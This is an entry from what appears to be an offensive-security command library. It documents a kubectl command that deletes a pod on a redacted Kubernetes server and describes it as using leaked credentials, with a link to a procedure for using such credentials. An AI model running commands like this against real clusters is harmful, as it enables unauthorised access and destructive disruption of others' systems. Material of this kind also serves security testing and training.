---
data: >-
  kubectl --client-certificate client.crt --client-key client.pem
  --certificate-authority ca.crt --server https://██████████ delete pod
  shell-demo
tags:
  - kubernetes
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 110393e0-3ef0-4e57-a5c0-dd11d7c54f4f
created_at: '2025-12-11T06:10:23.296Z'
updated_at: '2025-12-11T06:10:23.296Z'
verified: false
validated: true
submitted: true
---
# kubectl-delete-pod

## Command

```bash
kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████████ delete pod shell-demo
```

## Description

Deletes a specified pod in the Kubernetes cluster using leaked credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--client-certificate` | Client certificate file | Yes |
| `--client-key` | Client private key file | Yes |
| `--certificate-authority` | CA certificate file | Yes |
| `--server` | Kubernetes server URL | Yes |
| `delete pod` | Delete pod | Yes |

## Examples

### Basic Usage

```bash
kubectl --client-certificate cert.crt --client-key key.pem --certificate-authority ca.crt --server https://k8s-server delete pod my-pod
```

## Expected Output

pod "shell-demo" deleted

## Related

- [[commands/kubectl-create-pod]]
- [[procedures/Interact-with-Kubernetes-Cluster-Using-Leaked-Credentials]]
